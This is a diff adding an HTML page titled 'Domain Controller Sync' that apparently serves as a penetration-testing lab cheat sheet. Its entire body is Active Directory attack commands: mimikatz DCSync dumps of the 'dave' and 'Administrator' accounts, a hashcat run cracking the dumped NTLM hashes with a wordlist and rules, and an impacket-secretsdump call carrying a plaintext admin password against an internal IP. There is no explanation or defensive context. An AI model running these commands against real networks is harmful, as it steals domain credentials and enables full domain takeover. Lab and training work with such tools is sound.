@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Domain Controller Sync</title>
+</head><body>lsadump::dcsync /user:corp\dave<br/>
+<br/>
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force<br/>
+<br/>
+lsadump::dcsync /user:corp\Administrator<br/>
+<br/>
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@<b>192.168.233.70</b>&nbsp; &nbsp;<br/>
+<br/>
+</body></html>
